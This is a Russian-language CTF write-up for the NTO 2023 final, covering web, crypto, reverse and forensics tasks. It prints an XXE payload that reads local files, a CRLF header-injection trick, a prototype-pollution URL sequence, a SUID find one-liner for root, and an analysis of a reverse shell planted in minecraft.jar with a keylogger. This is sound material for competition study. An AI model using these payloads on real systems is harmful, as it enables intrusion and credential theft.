# nto-final-2023-solves

## WEB 1

Пробуем различные атаки, используя форму рассчёта цены. Расшифровываем входящие и исходящие данные, используя клиентский js-скрипт, расположенный на сайте.
Замечаем, что в функцию encrypted можно передать xml помимо json. Значит, можно попытаться совершить xxe-атаку. Пробуем передать следущие данные (используя burpsuite), предварительно зашифровав их:

    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]><data><countries>&xxe;</countries><startdate>&xxe;</startdate><enddate>&xxe;</enddate><resttype>&xxe;</resttype></data>

Получаем ответ от сервера, расшифровываем:

    {"format":"xml","data":"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///flag.txt\">\n]>\n<data>\n  <countries>nto{w3bs0ck3ts_plu5_xx3_1s_l0v3}\n</countries>\n  <startdate>nto{w3bs0ck3ts_plu5_xx3_1s_l0v3}\n</startdate>\n  <enddate>nto{w3bs0ck3ts_plu5_xx3_1s_l0v3}\n</enddate>\n  <resttype>nto{w3bs0ck3ts_plu5_xx3_1s_l0v3}\n</resttype>\n  <price>NaN</price>\n</data>\n"}

Видим, что флаг:

    nto{w3bs0ck3ts_plu5_xx3_1s_l0v3}

## WEB 2

Исследуем скрипт приложений. Замечаем уязвимость в скрипте приложения, запущенного на порте 3002: куки небезопасно вставляются и передаются в приложение на порте 3001.
Переменную flag мы менять не можем, а вот переменную username вольно задаём при регистрации. Используя burpsuite, пробуем применять header injection в username.

Передаём следующий ник:

    test\r

На сервере возникает ошибка, и он выводит нам сообщение:

Bad Request Bare CR or LF found in header line "Cookie: username=test ;flag=NTO{request_smuggling_917a34072663f9c8beea3b45e8f129c5}" (generated by waitress)

Как видим, флаг:

    nto{request_smuggling_917a34072663f9c8beea3b45e8f129c5}

## WEB 3

Анализируем исходный код приложения. Видим, что можно применить prtotype pollution, напрямую через интерфейс сайта. Видим, что в коде самого приложения уязвимостей нету. Изучаем на github исходные ходы библиотек, использующихся в приложении.
В исходном коде библиотеки passport находим подходящее свойство для prototype pollution - userProperty.
Замечаем, что при присваивании свойству userProrerty значения isLocalRequest, при аутенфикации в isLocalRequest запишется информация о пользователе. Последовательно переходим по следующим каталогам сайта:

    /pollute/userProperty/isLocalRequest
    /auth?username=test
    /admin/flag

Получаем флаг:

    nto{pr0t0typ3_pollut10n_g4dged5_f56acc00f5eb803de88496b}

## CRYPTO 1

После нескольких запусков исходного кода замечаем, что вывод первый чисел не зависит от длины введенной строки. Немного редактируем файл, дописывая полный перебор в его конец:

    orig = [277, 92, 775, ... 926, 1281, 631]
    res = ''

    for i in range(len(orig)):
       for j in 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLXCVBNM{}_1234567890':
         dihedral = DihedralCrypto(1337)
         answer = dihedral.hash((res + j).encode('utf-8'))
         if answer[i] == orig[i]:
           res += j
           break
    print(res)

Запустив его и подождав пару минут, получаем флаг:

    nto{5tr4ng3_gr0up_5tr4ng3_l0g_and_depressed_kid_zxc_ghoul}

## CRYPTO 2

Замечаем, что если очередной бит флага равен 1, то результат, возращаемый с сервера, может быть абсолютно любым. Иначе, результат не может быть меньше чем n // 2. Исольхуем этот факт при написании следующего кода:

    from requests import get
    from Crypto.Util.number import long_to_bytes

    n = 7260248502...14489681551

    def f():
      cur_i, ans = 0, ''
      res = None
      while True:
        for _ in range(10):
          res = get(f'http://10.10.25.10:1177/guess_bit?bit={cur_i}').json()
          if 'error' in res:
            return ans
          if res['guess'] < n // 2:
            ans += '1'
            cur_i += 1
            break
        else:
          cur_i += 1
          ans += '0'

    print(long_to_bytes(int(f(), 2)).decode('utf-8'))

Запускаем, получаем флаг:

    nto{0h_n0_t1m1ng}

## REVERSE 2

Открыв данный исполняемый файл в IDA, сразу идем в функцию, где происходит проверка флага (поиск по подстроке nto). В этой функции видно, что данная строка разбивается на 7 int32 чисел и переводится в little-endian формат. 
Далее мы находим вызовы в инициализацию эмулятора unicorn, а также 224-байтный шеллкод на архитектуре MIPS x32. При дизассемблинге данного шелла, мы находим основную проверку на корректность флага. Алгоритм шифрования выглядит так:

    flag[0] &= 0x2c2c2c2c;
    compare(flag[0], const0);
    flag[0] ^= flag[1];
    compare(flag[0], const1);
    flag[0] ^= flag[2];
    compare(flag[0], const1);
    ....
    flag[0] &= flag[6];
    compare(flag[0], const6);

В данном случае можно легко восстановить операции xor, т.к. они однозначно обратимы. Получаем флаг (неизвестные части - знак вопроса)

    nto{Wh0_54id????s_1S_M3d????

В случае с and (4 и 7 части флага), можно догадаться что это слова This и Medium. Получаем флаг:

    nto{Wh0_54id_Th1s_1S_M3dium}
   
## PART 2 - VM 1(LINUX)

Злоумышленник попал на машину используя reverse-shell вшитый в файл игры minecraft.jar. Он подключался на 192.168.126.129:4444 и выполнял удаленные команды. После заражения, используя linPEAS, злоумышленник использовал неправильно настроенный find с suid битом. Используя команду 

    find . -exec /bin/sh -p ; -quit 
   
он поднял права до root. После заражения, злоумышленник загрузил кейлоггер logkeys. В истории команд можно найти путь до исполняемого файла кейлоггера: /home/sergey/Downloads/build/src/logkeys. Загрузив файл в любой дизассемблер, можно быстро найти как кейлоггер берет путь до файла лога. В кейлоггере используется простой XOR по ключу. Расшифровав путь, получаем /var/log/logkeys.log. Там и хранятся логи. Это также видно из истории команд bash_history. В файле /var/log/logkeys.log злоумышленник нашел логи нажатий клавиш, откуда нашел пароль от keepass2: 

    1_D0N7_N0W_WHY_N07_M4Y83_345Y

Запустив keepass2 и введя этот пароль, можно найти пароль от "windows rdp": 

    SecretP@ss0rdMayby_0rNot&
